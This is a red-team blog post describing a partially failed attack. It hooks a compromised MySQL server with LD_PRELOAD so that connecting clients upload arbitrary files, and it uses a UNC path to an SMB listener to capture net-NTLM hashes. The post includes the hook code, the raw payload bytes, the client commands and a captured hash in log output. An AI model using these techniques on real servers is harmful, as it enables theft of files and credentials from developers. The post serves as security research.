---
layout: post
title: "That loyal MySQL is a rogue one: a tale of a (partially) failed idea"
date: 2020-07-12 01:03:37
categories: posts
en: true
description: Hooking mysld to steal net-NTLM hashes from developers. 
keywords: "net-ntlm, rogue mysql, hooking, red team, LD_PRELOAD, load data local"
authors:
    - X-C3LL
---

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Last week I read a random post where the author stated that net-NTLM hashes can be stolen via rogue MySQL server. This kind of attacks are really old and are based on how the MySQL protocol works: the server can ask to the client to upload an arbitrary file via [LOAD DATA statement](https://dev.mysql.com/doc/refman/8.0/en/load-data.html). I exploited this issue in the past to leak config files when I could manipulate the connection string used in a web application  (for example forcing it to connect to a emulated MySQL server like [Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server)).

 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 The idea of getting net-NTLM hashes got stucked in my head because in the past I had situations where I got root on development servers that are outside the domain.  If the servers are outside the domain but the developers are connecting to them from their domain-friendly shiny windows, we can try to steal those juicy Net-NTLM hashes to retrieve passwords or even trying to do a relay and add a computer to the domain and start the hardcore game.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Long story short: __I failed__. It is the year 2020, clients are well configured by default and don't let you read arbitrary files unless an insecure flag is set. You can steal Net-NTLM hashes if the developer misconfigured its client to accept LOAD DATA statements to upload local files, but you get it from SMB no from WebDav. AFAIK it is not posible to relay from SMB to LDAPs (maybe I am wrong, if it is posible please ping me at twitter ([@TheXC3LL](https://twitter.com/TheXC3LL))).

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
However I had fun playing a bit with this, so I am writing this article that maybe can help others to don't lose their time as I did. Also, I believe some concepts explained here can be useful, so... Let's go!


## 0x00 The Dark Side claims your mysqld

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The _"LOAD DATA local"_ issue can be exploited in two ways: "server-side" when you can control the connection string from a Web Application, for example; and "client-side" when the clients connect to your rogue MySQL service (via MITM or acting as a honeypot). But if you got root on the server where that MySQL service lies, you can manipulate it at your will and pwn whoever connect. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The easiest way to accomplish this is to install a hook on functions used to send the response messages from the server. If some condition is met we are going to change the original message for the payload used to steal an arbitrary file. The payload is composed like:

```c
//I just used GDB to check the value sent after
// LOAD DATA LOCAL INFILE '/tmp/misfits.txt' into table test FIELDS TERMINATED BY "\n";
char pwn[] = "(byte with size of filepath)\x00\x00\x01\xfb(filepath)"; 
``` 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
If we can restart the service (not always is posible if it is used in something critical) an approach based on LD_PRELOAD is the best one. You can edit the file used to launch the service and add the env var with your shared object with the hook. If it is not possible the restart, you are going to need to load it as a plugin (I explained it here ["Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5)"](https://x-c3ll.github.io/posts/Pivoting-MySQL-Proxy/)) and use **__attribute__((constructor))** to do the magic to install the hooks.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We need to hook __send()__ (for when client uses plaintext) and __SSL_write()__ (for when client forces SSL/TLS). Following the LD_PRELOAD approach we had to build something like:

```c
...
int SSL_write(SSL *ssl, const void *buf, int num) {
    int returned = 0;
    int (*original_SSL_write)(SSL *ssl, const void *buf, int num);
    
    original_SSL_write = dlsym(RTLD_NEXT, "SSL_write");
    
   
    char pwn[] = "payload";


    if (condition...) {
        original_SSL_write(ssl, pwn, sizeof(pwn));
    }
        returned = original_SSL_write(ssl, buf, num);
    
    return returned;
}


ssize_t send(int sockfd, const void *buf, size_t len, int flags) {
    ssize_t returned = 0;
    ssize_t (*original_send)(int sockfd, const void *buf, size_t len, int flags);
   
    original_send = dlsym(RTLD_NEXT, "send");
   
           
    char pwn[] = "payload";
 
 
    if (condition...) {
        original_send(sockfd, pwn, sizeof(pwn), flags);
    } 
        returned = original_send(sockfd, buf, len, flags);
     
    return returned;
 }
 ...
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
It is __clunky as hell__ and you are going to get errors because of packet out of order. This is just a PoC, so don't worry. In a real usage your hook has to be more "polite" __:P__.


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
All clients (or at least all I checked) send at some point queries to retrieve information like `select @@version_comment limit 1;`, so that can be one of the conditions met to select the message that is going to be edited on the fly. Also we are going to hook recv()/SSL_read in order to store the file stolen.


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
To test it we need to set the flag `--enable-local-infile` (__as I said before: this issue is patched in most clients, don't get lured by clickbait in articles from Twitter__). Let's set the payload to read the /etc/hosts, compile, restart the service and connect:

```
 mothra@arcadia ᐓ  ~/Documentos/research/roguemysql |
ᐓ   strace -Tfe trace=open mysql -u monty -p --enable-local-infile -h 127.0.0.1
```

aaaaaaaaand we got it:

```
Welcome to the MySQL monitor.  Commands end with ; or \g.
open("/etc/hosts", O_RDONLY)            = 4 <0.000071>  <---- HERE!!!
Your MySQL connection id is 12
Server version: 8.0.20

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

open("/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY) = 3 <0.000049>
open("/lib/terminfo/s/screen-256color", O_RDONLY) = 3 <0.000089>
open("/home/mothra/.editrc", O_RDONLY)  = -1 ENOENT (No such file or directory) <0.000087>
open("/home/mothra/.mysql_history", O_RDONLY) = 3 <0.000025>
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Ok, at this point we had a way to read arbitrary files when developers connect to our conquered MySQL. Let's move to other things.

## 0x01 Windows being Windows: the classic UNC path trick

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This is the never-ending story of "You asked for a file; here is your UNC path; now I got a net-NTLM hash". Nothing new, nothing fancy. Just the same old story. Start the [smbserver script](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket Framework and point your payload to it:

```c
char pwn[] = "\x21\x00\x00\x01\xfb\\\\192.168.245.141\\pwned\\abcd.jpeg";
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Aaaand connect to it from your windows machine (and again, clients are not vulnerable anymore, you need to set the flag ON PURPOSE):

```
C:\Program Files\MySQL\MySQL Workbench 8.0 CE>mysql -h 192.168.245.139 -u monty -p --enable-local-infile
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
You got a hash!

```
 mothra@arcadia ᐓ  ~/Descargas/impacket/examples |master
ᐓ   sudo python3 smbserver.py pwned /tmp
Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.245.136,1079)
[*] AUTHENTICATE_MESSAGE (insulapharmacum\psyconauta,INSULAPHARMACUM)
[*] User INSULAPHARMACUM\psyconauta authenticated successfully
[*] psyconauta::insulapharmacum:4141414141414141:75ba8ff10ed774b6a6a926fe1335871e:010100000000000080f256d35a58d6019925a63c88f79db70000000001001000560064006d005300440048007900680002001000630048004b006300650055005700750003001000560064006d005300440048007900680004001000630048004b00630065005500570075000700080080f256d35a58d601060004000200000008003000300000000000000001000000002000008942a3658e40bad820a1aa7b82a82b633e2f0720d0c10f258e8b10ca203d46e40a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200340035002e003100330039000000000000000000

```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The connection is made via SMB. [@ATTL4S](https://twitter.com/danilj94) from [Crummie5](https://www.crummie5.club/) shared with me [this ticket from the Impacket repo](https://github.com/SecureAuthCorp/impacket/issues/544) where it is said that __a relay from SMB to LDAPs is unviable__. I tried to force to do it via WebDav doing the trick of adding a port (\\ip@1337) but it not worked, so it looks like a dead end __:/__.

## 0x02 Conclusions

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
I usually write only about stuff that worked, hiding the failures but I believe that something can be learned from this kind of articles. If you enjoyed it, learned something new, or know how to go further with this attack scenario please ping me at [@TheXC3LL](https://twitter.com/TheXC3LL).
